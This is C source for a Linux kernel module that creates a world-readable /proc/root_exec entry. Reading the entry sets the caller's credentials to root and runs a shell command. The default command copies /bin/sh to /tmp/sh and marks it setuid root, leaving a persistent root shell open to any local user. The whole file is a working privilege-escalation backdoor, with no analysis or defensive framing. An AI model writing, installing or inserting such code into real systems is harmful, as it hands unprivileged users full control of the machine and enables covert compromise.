#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/sched.h>    // For current task
#include <linux/string.h>   // For string operations
#include <linux/kmod.h>     // For call_usermodehelper

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Kernel Module to Execute a Command as Root");
MODULE_VERSION("0.3");

// Module parameter: command to execute
static char *command = "/bin/cp /bin/sh /tmp/sh && /bin/chmod 4755 /tmp/sh";
module_param(command, charp, 0);
MODULE_PARM_DESC(command, "Command to execute as root");

// Function to execute a command as root
static void execute_command_as_root(void) {
    struct cred *new_cred;
    char *argv[] = { "/bin/sh", "-c", command, NULL };
    char *envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    int ret;

    // Get the current task's credentials
    new_cred = prepare_creds();
    if (!new_cred) {
        printk(KERN_ERR "Failed to prepare new credentials\n");
        return;
    }

    // Modify the credentials to give root privileges
    new_cred->uid = new_cred->euid = new_cred->suid = GLOBAL_ROOT_UID;
    new_cred->gid = new_cred->egid = new_cred->sgid = GLOBAL_ROOT_GID;

    // Commit the new credentials
    commit_creds(new_cred);

    // Execute the command using call_usermodehelper
    printk(KERN_INFO "Executing command as root: %s\n", command);
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if (ret < 0) {
        printk(KERN_ERR "Failed to execute command: %d\n", ret);
    }
}

// Function called when the /proc entry is read
static ssize_t proc_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {
    if (*ppos > 0) {
        return 0; // End of file
    }

    execute_command_as_root();

    *ppos = 1; // Mark as read
    return 0;
}

// File operations for the /proc entry
static const struct proc_ops proc_fops = {
    .proc_read = proc_read,
};

// Module initialization function
static int __init root_exec_init(void) {
    if (!command || strlen(command) == 0) {
        printk(KERN_ERR "No command specified\n");
        return -EINVAL;
    }

    // Create a /proc entry
    proc_create("root_exec", 0666, NULL, &proc_fops);
    printk(KERN_INFO "Root Exec Module: /proc/root_exec created\n");
    return 0;
}

// Module cleanup function
static void __exit root_exec_exit(void) {
    // Remove the /proc entry
    remove_proc_entry("root_exec", NULL);
    printk(KERN_INFO "Root Exec Module: /proc/root_exec removed\n");
}

module_init(root_exec_init);
module_exit(root_exec_exit);
